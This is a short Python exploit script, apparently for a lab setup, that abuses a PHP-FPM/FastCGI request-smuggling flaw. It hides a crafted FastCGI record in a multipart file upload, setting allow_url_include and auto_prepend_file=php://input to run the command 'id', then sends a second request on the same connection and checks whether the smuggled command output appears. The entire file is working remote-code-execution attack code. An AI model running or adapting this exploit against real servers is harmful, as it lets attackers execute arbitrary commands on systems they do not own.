# Two requests on one client connection: the smuggled record is only parsed when the front end
# reuses its FastCGI connection for the next request still in flight.

import socket
import sys
sys.path.insert(0, "/tmp/cve129289")
from exploit.exploit import make_blob
script, cmd = "/app/index.php", "id"
blob = make_blob(script, cmd, "allow_url_include=1\nauto_prepend_file=php://input")
boundary = "----phpfpm129289"
body = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\nx\r\n"
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"b\"; filename=\"b\"\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n").encode() + blob + f"\r\n--{boundary}--\r\n".encode()

def req(body_bytes, ctype="multipart/form-data; boundary=" + boundary):
    return (b"POST /index.php HTTP/1.1\r\nHost: lab\r\nContent-Type: " + ctype.encode() +
            b"\r\nContent-Length: " + str(len(body_bytes)).encode() + b"\r\n\r\n" + body_bytes)

s = socket.create_connection(("10.20.0.226", 8092), timeout=15)
s.sendall(req(body))
first = s.recv(65535)
head1, _, body1 = first.partition(b"\r\n\r\n")
print("response 1:", head1.split(b"\r\n")[0], "| body:", body1[:60])
# second request on the same client connection: nginx should reuse its FastCGI connection
s.sendall(req(b"second=1", "application/x-www-form-urlencoded"))
second = s.recv(65535)
body2 = second.split(b"\r\n\r\n",1)[1] if b"\r\n\r\n" in second else second
print("response 2:", second.split(b"\r\n")[0], "| body:", body2[:160])
print("SMUGGLED OUTPUT:", b"uid=" in second)
s.close()
